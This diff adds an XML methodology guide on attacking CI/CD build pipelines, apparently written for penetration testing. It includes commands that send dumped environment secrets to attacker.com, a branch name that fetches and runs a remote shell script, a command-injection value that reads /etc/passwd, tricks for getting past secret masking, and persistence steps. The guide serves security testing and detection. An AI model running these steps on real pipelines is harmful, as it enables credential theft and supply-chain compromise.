@@ -1,0 +1,267 @@
+<vulnerability_guide>
+  <title>BUILD PIPELINE ATTACKS</title>
+
+  <critical>Build pipelines transform source code into deployable artifacts with elevated privileges, access to secrets, and trust from production systems. Compromising a build pipeline provides a single point of leverage to compromise all downstream systems - the ultimate supply chain attack vector.</critical>
+
+  <scope>
+    - CI/CD configuration exploitation
+    - Build artifact poisoning
+    - Secrets and credential theft
+    - Pipeline injection attacks
+    - Build cache poisoning
+    - Artifact signing bypass
+  </scope>
+
+  <methodology>
+    1. PIPELINE ENUMERATION
+       {% raw %}
+       # Find CI/CD configuration files
+       find . -name ".github" -o -name ".gitlab-ci.yml" -o -name "Jenkinsfile" \
+              -o -name ".circleci" -o -name ".travis.yml" -o -name "azure-pipelines.yml" \
+              -o -name "buildspec.yml" -o -name ".drone.yml"
+
+       # GitHub Actions
+       ls -la .github/workflows/
+
+       # GitLab CI
+       cat .gitlab-ci.yml
+
+       # Jenkins
+       cat Jenkinsfile
+       # Also check: jenkins/, .jenkins/, config.xml
+
+       # Azure DevOps
+       cat azure-pipelines.yml
+
+       # Check for multiple pipeline configurations
+       # Organizations often have many pipelines
+       {% endraw %}
+
+    2. SECRETS EXTRACTION
+       {% raw %}
+       # Pipeline secrets are high-value targets
+
+       # GitHub Actions - dump environment
+       - run: env | base64 | curl -d @- https://attacker.com/
+
+       # GitLab CI - access CI variables
+       script:
+         - printenv | grep -i secret
+         - cat $CI_JOB_JWT  # GitLab JWT token
+
+       # Jenkins - credential dumping
+       withCredentials([string(credentialsId: 'secret', variable: 'SECRET')]) {
+         sh 'echo $SECRET | base64'  // Bypass masking
+       }
+
+       # AWS credentials in pipelines
+       - run: |
+           echo $AWS_ACCESS_KEY_ID
+           echo $AWS_SECRET_ACCESS_KEY
+       {% endraw %}
+
+    3. PIPELINE INJECTION
+       {% raw %}
+       # Inject into pipeline through:
+       # - Pull request modifications
+       # - Branch name injection
+       # - Commit message injection
+       # - Environment variable injection
+
+       # GitHub Actions - branch name injection
+       # If workflow uses: github.head_ref
+       # Create branch named: $(curl attacker.com/shell.sh|sh)
+
+       # GitLab CI - variable injection
+       # CI_COMMIT_MESSAGE can contain commands
+       # If used unsafely: script: echo "$CI_COMMIT_MESSAGE"
+
+       # Jenkins - parameter injection
+       # Build with parameters
+       # PARAM="; cat /etc/passwd"
+       {% endraw %}
+
+    4. BUILD CACHE POISONING
+       {% raw %}
+       # Caches speed up builds but can be poisoned
+
+       # GitHub Actions cache
+       - uses: actions/cache@v3
+         with:
+           path: ~/.npm
+           key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
+       # Attacker modifies cached dependencies
+
+       # Docker layer caching
+       # Poison base image layers
+       # All builds using that cache get malicious code
+
+       # Maven/Gradle cache
+       # ~/.m2/repository poisoning
+       # Replace legitimate JARs with malicious ones
+
+       # Cache key manipulation
+       # Predictable cache keys = targeted poisoning
+       {% endraw %}
+
+    5. ARTIFACT MANIPULATION
+       {% raw %}
+       # Build artifacts are often trusted without verification
+
+       # Docker image tagging
+       # Push malicious image with same tag
+       docker push registry.com/app:latest  # Overwrites legitimate
+
+       # Package publishing
+       # If build publishes packages:
+       npm publish  # Publish malicious version
+
+       # Binary artifact replacement
+       # S3/GCS artifacts often not signed
+       aws s3 cp malicious.bin s3://build-artifacts/release.bin
+
+       # Release asset tampering
+       # GitHub releases can be modified
+       # Replace binaries after release announcement
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <self_hosted_runner_exploitation>
+      {% raw %}
+      # Self-hosted runners are persistent targets
+
+      # GitHub Actions self-hosted
+      # - No isolation between jobs
+      # - Persistent filesystem access
+      # - Access to other secrets
+
+      # Exploitation:
+      # 1. Get job scheduled on self-hosted runner
+      # 2. Leave persistent backdoor
+      # 3. Harvest secrets from future jobs
+
+      # Runner privilege escalation
+      # Runner often runs as root/Administrator
+      # Access to Docker socket
+      # Network access to internal systems
+      {% endraw %}
+    </self_hosted_runner_exploitation>
+
+    <pipeline_hijacking>
+      {% raw %}
+      # Modify pipeline configuration via:
+
+      # 1. Direct config file modification
+      # Push to branch with modified .github/workflows/
+
+      # 2. Workflow dispatch exploitation
+      on:
+        workflow_dispatch:
+          inputs:
+            command:
+              description: 'Command to run'
+      # Trigger with malicious input
+
+      # 3. Reusable workflow attacks
+      uses: attacker/malicious-action@main
+      # Supply chain through actions
+
+      # 4. Composite action modification
+      # Modify shared action repository
+      {% endraw %}
+    </pipeline_hijacking>
+
+    <oidc_token_abuse>
+      {% raw %}
+      # Cloud providers offer OIDC tokens to pipelines
+
+      # GitHub Actions OIDC
+      - uses: aws-actions/configure-aws-credentials@v2
+        with:
+          role-to-assume: arn:aws:iam::ACCOUNT:role/DeployRole
+          aws-region: us-east-1
+
+      # Abuse: Fork repo, modify workflow, get OIDC token
+      # If role trust policy is too permissive
+
+      # Check role trust policy for:
+      # - Missing repo restriction
+      # - Missing branch restriction
+      # - Accepting any GitHub repo
+      {% endraw %}
+    </oidc_token_abuse>
+
+    <artifact_registry_poisoning>
+      {% raw %}
+      # Target artifact storage systems
+
+      # Docker Registry
+      # Push malicious layers to shared registry
+      # Overwrite existing tags
+
+      # NPM/PyPI private registry
+      # Publish malicious package versions
+      # Higher version numbers preferred
+
+      # Maven repository
+      # Upload malicious JARs
+      # Snapshots are especially vulnerable
+
+      # OCI artifacts
+      # cosign signatures can be bypassed
+      # Attestations may not be verified
+      {% endraw %}
+    </artifact_registry_poisoning>
+
+    <pipeline_persistence>
+      {% raw %}
+      # Maintain access through:
+
+      # 1. Cron-triggered workflows
+      on:
+        schedule:
+          - cron: '0 * * * *'  # Hourly
+
+      # 2. Webhook modifications
+      # Add webhook to exfiltrate on push
+
+      # 3. Deploy key injection
+      # Add attacker's SSH key as deploy key
+
+      # 4. Bot account creation
+      # Create service account with pipeline access
+
+      # 5. Self-modifying workflows
+      # Workflow that updates itself
+      {% endraw %}
+    </pipeline_persistence>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor pipeline configuration changes
+    - Alert on new secrets access
+    - Track artifact signature verification
+    - Review self-hosted runner access
+    - Audit OIDC trust policies
+  </detection>
+
+  <validation>
+    - Extract secrets from build logs
+    - Demonstrate pipeline injection
+    - Poison build cache successfully
+    - Tamper with build artifacts
+    - Establish pipeline persistence
+  </validation>
+
+  <pro_tips>
+    - GITHUB_TOKEN in PRs has limited permissions - check what it can do
+    - GitLab CI_JOB_JWT is powerful - can assume cloud roles
+    - Self-hosted runners are always more vulnerable than cloud runners
+    - Build logs often contain secrets despite "masking"
+    - Check for workflow_dispatch - easy target for injection
+    - fork + PR can execute workflows in many configurations
+  </pro_tips>
+
+  <remember>Build pipelines are trusted to create what runs in production. They have secrets to push artifacts, deploy code, and access production systems. A compromised pipeline can inject malware into every release, steal every secret, and persist indefinitely. Pipeline security is production security.</remember>
+</vulnerability_guide>
